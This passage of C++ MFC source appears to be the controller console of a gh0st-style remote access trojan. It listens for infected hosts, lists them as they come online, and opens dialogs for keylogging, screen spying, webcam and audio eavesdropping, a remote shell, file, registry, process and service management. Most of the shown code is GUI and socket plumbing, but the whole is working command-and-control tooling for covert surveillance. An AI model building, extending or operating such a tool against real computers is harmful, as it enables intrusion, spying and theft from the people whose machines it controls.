	POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
	while(Pos)
	{
		int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
		CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)m_CList_Online.GetItemData(iItem);
		if (szBuffer[0]== COMMAND_WEBCAM && ContextObject->sClientInfo[ONLINELIST_VIDEO] == CString("无"))
		{
			continue;
		}
		// 发送获得驱动器列表数据包
		m_iocpServer->OnClientPreSending(ContextObject,szBuffer, ulLength);
	} 
	LeaveCriticalSection(&m_cs);
}

//真彩Bar
VOID CMy2015RemoteDlg::OnAbout()
{
	MessageBox("Copyleft (c) FTU 2025" + CString("\n编译日期: ") + __DATE__ + 
		CString(sizeof(void*)==8 ? " (x64)" : " (x86)"), "关于");
}

//托盘Menu
void CMy2015RemoteDlg::OnNotifyShow()
{
	BOOL v=	IsWindowVisible();
	ShowWindow(v? SW_HIDE : SW_SHOW);
}


void CMy2015RemoteDlg::OnNotifyExit()
{
	Release();
	CDialogEx::OnOK(); // 关闭对话框
}


//固态菜单
void CMy2015RemoteDlg::OnMainSet()
{
	int nMaxConnection = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetInt("settings", "MaxConnection");
	CSettingDlg  Dlg;

	Dlg.DoModal();   //模态 阻塞
	if (nMaxConnection != Dlg.m_nMax_Connect)
	{
		m_iocpServer->UpdateMaxConnection(Dlg.m_nMax_Connect);
	}

	int n = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetInt("settings", "SoftwareDetect");
	if (n == m_settings.DetectSoftware) return;

	LVCOLUMN lvColumn;
	memset(&lvColumn, 0, sizeof(LVCOLUMN));
	lvColumn.mask = LVCF_TEXT;
	lvColumn.pszText = Dlg.m_sSoftwareDetect.GetBuffer();
	m_settings.DetectSoftware = n;
	CLock L(m_cs);
	m_CList_Online.SetColumn(ONLINELIST_VIDEO, &lvColumn);
	SendMasterSettings(nullptr);
}


void CMy2015RemoteDlg::OnMainExit()
{
	Release();
	CDialogEx::OnOK(); // 关闭对话框
}

BOOL CMy2015RemoteDlg::ListenPort()
{
	int nPort = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetInt("settings", "ghost");
	//读取ini 文件中的监听端口
	int nMaxConnection = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetInt("settings", "MaxConnection");
	//读取最大连接数
	if (nPort<=0 || nPort>65535)
		nPort = 6543;
	if (nMaxConnection <= 0)
		nMaxConnection = 10000;
	return Activate(nPort,nMaxConnection);             //开始监听
}


BOOL CMy2015RemoteDlg::Activate(int nPort,int nMaxConnection)
{
	assert(m_iocpServer);
	UINT ret = 0;
	if ( (ret=m_iocpServer->StartServer(NotifyProc, OfflineProc, nPort)) !=0 )
	{
		OutputDebugStringA("======> StartServer Failed \n");
		char code[32];
		sprintf_s(code, "%d", ret);
		MessageBox("调用函数StartServer失败! 错误代码:"+CString(code));
		return FALSE;
	}

	CString strTemp;
	strTemp.Format("监听端口: %d成功", nPort);
	ShowMessage(true,strTemp);
	return TRUE;
}


VOID CALLBACK CMy2015RemoteDlg::NotifyProc(CONTEXT_OBJECT* ContextObject)
{
	if (!g_2015RemoteDlg)
		return;

	AUTO_TICK(50);

	switch (ContextObject->v1)
	{
	case VIDEO_DLG:
	{
		CVideoDlg* Dlg = (CVideoDlg*)ContextObject->hDlg;
		Dlg->OnReceiveComplete();
		break;
	}
	case SERVICES_DLG:
	{
		CServicesDlg* Dlg = (CServicesDlg*)ContextObject->hDlg;
		Dlg->OnReceiveComplete();
		break;
	}
	case AUDIO_DLG:
	{
		CAudioDlg* Dlg = (CAudioDlg*)ContextObject->hDlg;
		Dlg->OnReceiveComplete();
		break;
	}
	case SYSTEM_DLG:
	{
		CSystemDlg* Dlg = (CSystemDlg*)ContextObject->hDlg;
		Dlg->OnReceiveComplete();
		break;
	}
	case SHELL_DLG:
	{
		CShellDlg* Dlg = (CShellDlg*)ContextObject->hDlg;
		Dlg->OnReceiveComplete();
		break;
	}
	case SCREENSPY_DLG:
	{
		CScreenSpyDlg* Dlg = (CScreenSpyDlg*)ContextObject->hDlg;
		Dlg->OnReceiveComplete();
		break;
	}
	case FILEMANAGER_DLG:
	{
		CFileManagerDlg* Dlg = (CFileManagerDlg*)ContextObject->hDlg;
		Dlg->OnReceiveComplete();
		break;
	}
	case REGISTER_DLG:
	{
		CRegisterDlg* Dlg = (CRegisterDlg*)ContextObject->hDlg;
		Dlg->OnReceiveComplete();
		break;
	}
	case KEYBOARD_DLG:
	{
		CKeyBoardDlg* Dlg = (CKeyBoardDlg*)ContextObject->hDlg;
		Dlg->OnReceiveComplete();
		break;
	}
	default: {
		HANDLE hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
		if (hEvent == NULL) {
			Mprintf("===> NotifyProc CreateEvent FAILED: %p <===\n", ContextObject);
			return;
		}
		if (!g_2015RemoteDlg->PostMessage(WM_HANDLEMESSAGE, (WPARAM)hEvent, (LPARAM)ContextObject)) {
			Mprintf("===> NotifyProc PostMessage FAILED: %p <===\n", ContextObject);
			CloseHandle(hEvent);
			return;
		}
		HANDLE handles[2] = { hEvent, g_2015RemoteDlg->m_hExit };
		DWORD result = WaitForMultipleObjects(2, handles, FALSE, INFINITE);
	}
	}
}

// 对话框句柄及对话框类型
struct dlgInfo
{
	HANDLE hDlg;
	int v1;
	dlgInfo(HANDLE h, int type) : hDlg(h), v1(type) { }
};

VOID CALLBACK CMy2015RemoteDlg::OfflineProc(CONTEXT_OBJECT* ContextObject)
{
	if (!g_2015RemoteDlg)
		return;
	dlgInfo* dlg = ContextObject->v1 > 0 ? new dlgInfo(ContextObject->hDlg, ContextObject->v1) : NULL;

	SOCKET nSocket = ContextObject->sClientSocket;

	g_2015RemoteDlg->PostMessage(WM_USEROFFLINEMSG, (WPARAM)dlg, (LPARAM)nSocket);

	ContextObject->v1 = 0;
}


LRESULT CMy2015RemoteDlg::OnHandleMessage(WPARAM wParam, LPARAM lParam) {
	HANDLE hEvent = (HANDLE)wParam;
	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;
	MessageHandle(ContextObject);
	if (hEvent) {
		SetEvent(hEvent);
		CloseHandle(hEvent);
	}
	return S_OK;
}


VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject) 
{
	if (isClosed) {
		return;
	}
	switch (ContextObject->InDeCompressedBuffer.GetBYTE(0))
	{
	case TOKEN_HEARTBEAT: case 137:
		UpdateActiveWindow(ContextObject);
		break;
	case SOCKET_DLLLOADER: {// 请求DLL
		BYTE cmd[32] = { COMMAND_BYE };
		const char reason[] = "请求不支持, 主控命令其退出!";
		memcpy(cmd + 1, reason, sizeof(reason));
		m_iocpServer->Send(ContextObject, cmd, sizeof(cmd));
		break;
	}
	case COMMAND_BYE: // 主机下线
		{
			CancelIo((HANDLE)ContextObject->sClientSocket);
			closesocket(ContextObject->sClientSocket); 
			Sleep(10);
			break;
		}
	case TOKEN_KEYBOARD_START: {// 键盘记录
			g_2015RemoteDlg->SendMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)ContextObject);
			break;
		}
	case TOKEN_LOGIN: // 上线包  shine
		{
			g_2015RemoteDlg->SendMessage(WM_USERTOONLINELIST, 0, (LPARAM)ContextObject); 
			break;
		}
	case TOKEN_BITMAPINFO: // 远程桌面
		{
			g_2015RemoteDlg->SendMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)ContextObject);
			break;
		}
	case TOKEN_DRIVE_LIST: // 文件管理
		{
			g_2015RemoteDlg->SendMessage(WM_OPENFILEMANAGERDIALOG, 0, (LPARAM)ContextObject);
			break;
		}
	case TOKEN_TALK_START: // 发送消息
		{
			g_2015RemoteDlg->SendMessage(WM_OPENTALKDIALOG, 0, (LPARAM)ContextObject);
			break;
		}
	case TOKEN_SHELL_START: // 远程终端
		{
			g_2015RemoteDlg->SendMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)ContextObject);
			break;
		}
	case TOKEN_WSLIST:  // 窗口管理
	case TOKEN_PSLIST:  // 进程管理
		{
			g_2015RemoteDlg->SendMessage(WM_OPENSYSTEMDIALOG, 0, (LPARAM)ContextObject);
			break;
		}
	case TOKEN_AUDIO_START: // 语音监听
		{
			g_2015RemoteDlg->SendMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)ContextObject);
			break;
		}
	case TOKEN_REGEDIT: // 注册表管理
		{                            
			g_2015RemoteDlg->SendMessage(WM_OPENREGISTERDIALOG, 0, (LPARAM)ContextObject);
			break;
		}
	case TOKEN_SERVERLIST: // 服务管理
		{
			g_2015RemoteDlg->SendMessage(WM_OPENSERVICESDIALOG, 0, (LPARAM)ContextObject);
			break;
		}
	case TOKEN_WEBCAM_BITMAPINFO: // 摄像头
		{
			g_2015RemoteDlg->SendMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)ContextObject);
			break;
		}
	}
}

LRESULT CMy2015RemoteDlg::OnUserToOnlineList(WPARAM wParam, LPARAM lParam)
{
	CString strIP,  strAddr,  strPCName, strOS, strCPU, strVideo, strPing;
	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam; //注意这里的  ClientContext  正是发送数据时从列表里取出的数据

	if (ContextObject == NULL || isClosed)
	{
		return -1;
	}

	try
	{

		sockaddr_in  ClientAddr;
		memset(&ClientAddr, 0, sizeof(ClientAddr));
		int iClientAddrLen = sizeof(sockaddr_in);
		SOCKET nSocket = ContextObject->sClientSocket;
		BOOL bOk = getpeername(nSocket, (SOCKADDR*)&ClientAddr, &iClientAddrLen);
		// 不合法的数据包
		if (ContextObject->InDeCompressedBuffer.GetBufferLength() != sizeof(LOGIN_INFOR))
		{
			char buf[100];
			sprintf_s(buf, "*** Received [%s] invalid login data! ***\n", inet_ntoa(ClientAddr.sin_addr));
			OutputDebugStringA(buf);
			return -1;
		}

		LOGIN_INFOR* LoginInfor = new LOGIN_INFOR;
		ContextObject->InDeCompressedBuffer.CopyBuffer((LPBYTE)LoginInfor, sizeof(LOGIN_INFOR), 0);

		strIP = inet_ntoa(ClientAddr.sin_addr);

		//主机名称
		strPCName = LoginInfor->szPCName;

		//版本信息
		strOS = LoginInfor->OsVerInfoEx;

		//CPU
		strCPU.Format("%dMHz", LoginInfor->dwCPUMHz);

		//网速
		strPing.Format("%d", LoginInfor->dwSpeed);

		strVideo = m_settings.DetectSoftware ? "无" : LoginInfor->bWebCamIsExist ? "有" : "无";

		strAddr.Format("%d", nSocket);
		AddList(strIP,strAddr,strPCName,strOS,strCPU,strVideo,strPing,LoginInfor->moduleVersion,LoginInfor->szStartTime, 
			LoginInfor->szReserved,ContextObject);
		delete LoginInfor;
		return S_OK;
	}catch(...){
		OutputDebugStringA("[ERROR] OnUserToOnlineList catch an error \n");
	}
	return -1;
}


LRESULT CMy2015RemoteDlg::OnUserOfflineMsg(WPARAM wParam, LPARAM lParam)
{
	OutputDebugStringA("======> OnUserOfflineMsg\n");
	CString ip, port;
	port.Format("%d", lParam);
	EnterCriticalSection(&m_cs);
	int n = m_CList_Online.GetItemCount();
	for (int i = 0; i < n; ++i)
	{
		CString cur = m_CList_Online.GetItemText(i, ONLINELIST_ADDR);
		if (cur == port)
		{
			ip = m_CList_Online.GetItemText(i, ONLINELIST_IP);
			m_CList_Online.DeleteItem(i);
			ShowMessage(true, ip + "主机下线");
			break;
		}
	}
	LeaveCriticalSection(&m_cs);

	dlgInfo *p = (dlgInfo *)wParam;
	if (p)
	{
		switch(p->v1)
		{
		case TALK_DLG:
			{
				CTalkDlg *Dlg = (CTalkDlg*)p->hDlg;
				delete Dlg;
				break;
			}
		case VIDEO_DLG:
			{
				CVideoDlg *Dlg = (CVideoDlg*)p->hDlg;
				delete Dlg;
				break;
			}
		case SERVICES_DLG:
			{
				CServicesDlg *Dlg = (CServicesDlg*)p->hDlg;
				delete Dlg;
				break;
			}
		case AUDIO_DLG:
			{
				CAudioDlg *Dlg = (CAudioDlg*)p->hDlg;
				delete Dlg;
				break;
			}
		case SYSTEM_DLG:
			{
				CSystemDlg *Dlg = (CSystemDlg*)p->hDlg;
				delete Dlg;
				break;
			}
		case SHELL_DLG:
			{
				CShellDlg *Dlg = (CShellDlg*)p->hDlg;
				delete Dlg;
				break;
			}
		case SCREENSPY_DLG:
			{
				CScreenSpyDlg *Dlg = (CScreenSpyDlg*)p->hDlg;
				delete Dlg;
				break;
			}
		case FILEMANAGER_DLG:
			{
				CFileManagerDlg *Dlg = (CFileManagerDlg*)p->hDlg;
				delete Dlg;
				break;
			}
		case REGISTER_DLG:
			{
				CRegisterDlg *Dlg = (CRegisterDlg*)p->hDlg;
				delete Dlg; //特殊处理
				break;
			}
		case KEYBOARD_DLG:
			{
				CKeyBoardDlg* Dlg = (CKeyBoardDlg*)p->hDlg;
				delete Dlg;
				break;
			}
		default:break;
		}
		delete p;
		p = NULL;
	}

	return S_OK;
}

void CMy2015RemoteDlg::UpdateActiveWindow(CONTEXT_OBJECT* ctx) {
	Heartbeat hb;
	ctx->InDeCompressedBuffer.CopyBuffer(&hb, sizeof(Heartbeat), 1);

	// 回复心跳
	{
		HeartbeatACK ack = { hb.Time };
		BYTE buf[sizeof(HeartbeatACK) + 1] = { CMD_HEARTBEAT_ACK};
		memcpy(buf + 1, &ack, sizeof(HeartbeatACK));
		m_iocpServer->Send(ctx, buf, sizeof(buf));
	}

	CLock L(m_cs);
	int n = m_CList_Online.GetItemCount();
	DWORD_PTR cur = (DWORD_PTR)ctx;
	for (int i = 0; i < n; ++i) {
		DWORD_PTR id = m_CList_Online.GetItemData(i);
		if (id == cur) {
			m_CList_Online.SetItemText(i, ONLINELIST_LOGINTIME, hb.ActiveWnd);
			if (hb.Ping > 0)
				m_CList_Online.SetItemText(i, ONLINELIST_PING, std::to_string(hb.Ping).c_str());
			if (m_settings.DetectSoftware)
				m_CList_Online.SetItemText(i, ONLINELIST_VIDEO, hb.HasSoftware ? "有" : "无");
			return;
		}
	}
}


void CMy2015RemoteDlg::SendMasterSettings(CONTEXT_OBJECT* ctx) {
	BYTE buf[sizeof(MasterSettings) + 1] = { CMD_MASTERSETTING };
	memcpy(buf+1, &m_settings, sizeof(MasterSettings));

	if (ctx) {
		m_iocpServer->Send(ctx, buf, sizeof(buf));
	}
	else {
		EnterCriticalSection(&m_cs);
		POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
		while (Pos)
		{
			int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
			CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)m_CList_Online.GetItemData(iItem);
			m_iocpServer->Send(ContextObject, buf, sizeof(buf));
		}
		LeaveCriticalSection(&m_cs);
	}
}


LRESULT CMy2015RemoteDlg::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;

	CScreenSpyDlg	*Dlg = new CScreenSpyDlg(this,m_iocpServer, ContextObject);   //Send  s
	// 设置父窗口为卓面
	Dlg->Create(IDD_DIALOG_SCREEN_SPY, GetDesktopWindow());
	Dlg->ShowWindow(SW_SHOWMAXIMIZED);

	ContextObject->v1   = SCREENSPY_DLG;
	ContextObject->hDlg = Dlg;

	return 0;
}

LRESULT CMy2015RemoteDlg::OnOpenFileManagerDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;

	//转到CFileManagerDlg  构造函数
	CFileManagerDlg	*Dlg = new CFileManagerDlg(this,m_iocpServer, ContextObject);
	// 设置父窗口为卓面
	Dlg->Create(IDD_FILE, GetDesktopWindow());    //创建非阻塞的Dlg
	Dlg->ShowWindow(SW_SHOW);

	ContextObject->v1   = FILEMANAGER_DLG;
	ContextObject->hDlg = Dlg;
	EnterCriticalSection(&m_cs);
	/*
	for (std::vector<CFileManagerDlg *>::iterator iter = v_FileDlg.begin(); 
		iter != v_FileDlg.end(); )
	{
		CFileManagerDlg *cur = *iter;
		if (cur->m_bIsClosed)
		{
			delete cur;
			iter = v_FileDlg.erase(iter);
		}else{
			++iter;
		}
	}
	v_FileDlg.push_back(Dlg);
	*/
	LeaveCriticalSection(&m_cs);

	return 0;
}

LRESULT CMy2015RemoteDlg::OnOpenTalkDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;

	//转到CFileManagerDlg  构造函数
	CTalkDlg	*Dlg = new CTalkDlg(this,m_iocpServer, ContextObject);
	// 设置父窗口为卓面
	Dlg->Create(IDD_DIALOG_TALK, GetDesktopWindow());    //创建非阻塞的Dlg
	Dlg->ShowWindow(SW_SHOW);

	ContextObject->v1   = TALK_DLG;
	ContextObject->hDlg = Dlg;

	return 0;
}

LRESULT CMy2015RemoteDlg::OnOpenShellDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;

	//转到CFileManagerDlg  构造函数
	CShellDlg	*Dlg = new CShellDlg(this,m_iocpServer, ContextObject);
	// 设置父窗口为卓面
	Dlg->Create(IDD_DIALOG_SHELL, GetDesktopWindow());    //创建非阻塞的Dlg
	Dlg->ShowWindow(SW_SHOW);

	ContextObject->v1   = SHELL_DLG;
	ContextObject->hDlg = Dlg;

	return 0;
}


LRESULT CMy2015RemoteDlg::OnOpenSystemDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;

	//转到CFileManagerDlg  构造函数
	CSystemDlg	*Dlg = new CSystemDlg(this,m_iocpServer, ContextObject);
	// 设置父窗口为卓面
	Dlg->Create(IDD_DIALOG_SYSTEM, GetDesktopWindow());    //创建非阻塞的Dlg
	Dlg->ShowWindow(SW_SHOW);

	ContextObject->v1   = SYSTEM_DLG;
	ContextObject->hDlg = Dlg;

	return 0;
}

LRESULT CMy2015RemoteDlg::OnOpenAudioDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;

	//转到CFileManagerDlg  构造函数
	CAudioDlg	*Dlg = new CAudioDlg(this,m_iocpServer, ContextObject);
	// 设置父窗口为卓面
	Dlg->Create(IDD_DIALOG_AUDIO, GetDesktopWindow());    //创建非阻塞的Dlg
	Dlg->ShowWindow(SW_SHOW);

	ContextObject->v1   = AUDIO_DLG;
	ContextObject->hDlg = Dlg;

	return 0;
}

LRESULT CMy2015RemoteDlg::OnOpenServicesDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;

	//转到CFileManagerDlg  构造函数
	CServicesDlg	*Dlg = new CServicesDlg(this,m_iocpServer, ContextObject);
	// 设置父窗口为卓面
	Dlg->Create(IDD_DIALOG_SERVICES, GetDesktopWindow());    //创建非阻塞的Dlg
	Dlg->ShowWindow(SW_SHOW);

	ContextObject->v1   = SERVICES_DLG;
	ContextObject->hDlg = Dlg;

	return 0;
}

LRESULT CMy2015RemoteDlg::OnOpenRegisterDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;

	//转到CFileManagerDlg  构造函数
	CRegisterDlg	*Dlg = new CRegisterDlg(this,m_iocpServer, ContextObject);
	// 设置父窗口为卓面
	Dlg->Create(IDD_DIALOG_REGISTER, GetDesktopWindow());    //创建非阻塞的Dlg
	Dlg->ShowWindow(SW_SHOW);

	ContextObject->v1   = REGISTER_DLG;
	ContextObject->hDlg = Dlg;

	return 0;
}

LRESULT CMy2015RemoteDlg::OnOpenVideoDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)lParam;

	//转到CFileManagerDlg  构造函数
	CVideoDlg	*Dlg = new CVideoDlg(this,m_iocpServer, ContextObject);
	// 设置父窗口为卓面
	Dlg->Create(IDD_DIALOG_VIDEO, GetDesktopWindow());    //创建非阻塞的Dlg
	Dlg->ShowWindow(SW_SHOW);

	ContextObject->v1   = VIDEO_DLG;
	ContextObject->hDlg = Dlg;

	return 0;
}

LRESULT CMy2015RemoteDlg::OnOpenKeyboardDialog(WPARAM wParam, LPARAM lParam)
{
	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;

	CKeyBoardDlg* Dlg = new CKeyBoardDlg(this, m_iocpServer, ContextObject);
	// 设置父窗口为卓面
	Dlg->Create(IDD_DLG_KEYBOARD, GetDesktopWindow());    //创建非阻塞的Dlg
	Dlg->ShowWindow(SW_SHOW);

	ContextObject->v1 = KEYBOARD_DLG;
	ContextObject->hDlg = Dlg;

	return 0;
}

BOOL CMy2015RemoteDlg::OnHelpInfo(HELPINFO* pHelpInfo)
{
	MessageBox("Copyleft (c) FTU 2025", "关于");
	return TRUE;
}


BOOL CMy2015RemoteDlg::PreTranslateMessage(MSG* pMsg)
{
	if (pMsg->message == WM_KEYDOWN && pMsg->wParam == VK_RETURN)
	{
		return TRUE;
	}

	return CDialogEx::PreTranslateMessage(pMsg);
}
